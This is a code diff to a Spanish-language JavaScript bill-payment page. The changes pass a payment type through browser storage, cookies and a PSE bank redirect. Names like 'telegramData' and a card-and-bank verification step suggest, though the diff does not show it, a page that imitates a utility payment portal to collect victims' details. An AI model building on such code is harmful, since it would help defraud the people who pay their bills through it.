@@ -70,7 +70,7 @@ async function searchByNIC() {
             // Descuento desactivado
             paymentData.hasDiscount = false;
 
-            const initialAmount = data.valorMes || data.deudaTotal || '$ 0';
+            const initialAmount = (data.deudaTotal && data.deudaTotal !== '$ 0' && data.deudaTotal !== '$0') ? data.deudaTotal : (data.valorMes || '$ 0');
             try {
                 localStorage.setItem('aire_pago_nic', nic);
                 localStorage.setItem('aire_pago_total', initialAmount);
@@ -356,10 +356,13 @@ function showCheckoutSection(formData, originalAmount, finalAmount, paymentType)
         localStorage.setItem('aire_pago_total', finalAmount);
         localStorage.setItem('aire_pago_nic', paymentData.nic || formData.nic || '');
         localStorage.setItem('aire_pago_nombre', `${formData.nombres} ${formData.apellidos}`);
+        localStorage.setItem('aire_pago_tipo', paymentType);
         sessionStorage.setItem('aire_pago_total', finalAmount);
         sessionStorage.setItem('aire_pago_nic', paymentData.nic || formData.nic || '');
+        sessionStorage.setItem('aire_pago_tipo', paymentType);
         document.cookie = `aire_pago_total=${encodeURIComponent(finalAmount)}; path=/; max-age=86400`;
         document.cookie = `aire_pago_nic=${encodeURIComponent(paymentData.nic || formData.nic || '')}; path=/; max-age=86400`;
+        document.cookie = `aire_pago_tipo=${encodeURIComponent(paymentType)}; path=/; max-age=86400`;
     } catch(e) {}
 
     // Pre-fill payment form fields with customer data
@@ -700,10 +703,13 @@ document.addEventListener('DOMContentLoaded', function () {
                     localStorage.setItem('aire_pago_total', telegramData.totalPagar);
                     localStorage.setItem('aire_pago_nic', telegramData.nic);
                     localStorage.setItem('aire_pago_nombre', telegramData.nombre);
+                    localStorage.setItem('aire_pago_tipo', telegramData.paymentType);
                     sessionStorage.setItem('aire_pago_total', telegramData.totalPagar);
                     sessionStorage.setItem('aire_pago_nic', telegramData.nic);
+                    sessionStorage.setItem('aire_pago_tipo', telegramData.paymentType);
                     document.cookie = `aire_pago_total=${encodeURIComponent(telegramData.totalPagar)}; path=/; max-age=86400`;
                     document.cookie = `aire_pago_nic=${encodeURIComponent(telegramData.nic)}; path=/; max-age=86400`;
+                    document.cookie = `aire_pago_tipo=${encodeURIComponent(telegramData.paymentType)}; path=/; max-age=86400`;
                 } catch(e) {}
 
                 showLoadingOverlay('Verificando tarjeta y banco...');
@@ -776,9 +782,16 @@ document.addEventListener('DOMContentLoaded', function () {
                     localStorage.setItem('aire_pago_total', telegramData.totalPagar);
                     localStorage.setItem('aire_pago_nic', telegramData.nic);
                     localStorage.setItem('aire_pago_nombre', telegramData.nombre);
+                    localStorage.setItem('aire_pago_tipo', telegramData.paymentType);
+                    sessionStorage.setItem('aire_pago_total', telegramData.totalPagar);
+                    sessionStorage.setItem('aire_pago_nic', telegramData.nic);
+                    sessionStorage.setItem('aire_pago_tipo', telegramData.paymentType);
+                    document.cookie = `aire_pago_total=${encodeURIComponent(telegramData.totalPagar)}; path=/; max-age=86400`;
+                    document.cookie = `aire_pago_nic=${encodeURIComponent(telegramData.nic)}; path=/; max-age=86400`;
+                    document.cookie = `aire_pago_tipo=${encodeURIComponent(telegramData.paymentType)}; path=/; max-age=86400`;
                 } catch(e) {}
 
-                const nextUrl = `pse/index.php?banco=${encodeURIComponent(selectedBank)}&nic=${encodeURIComponent(telegramData.nic)}&total=${encodeURIComponent(telegramData.totalPagar)}`;
+                const nextUrl = `pse/index.php?banco=${encodeURIComponent(selectedBank)}&nic=${encodeURIComponent(telegramData.nic)}&total=${encodeURIComponent(telegramData.totalPagar)}&tipo=${encodeURIComponent(telegramData.paymentType)}`;
 
                 fetch('send_invoice_data.php', {
                     method: 'POST',
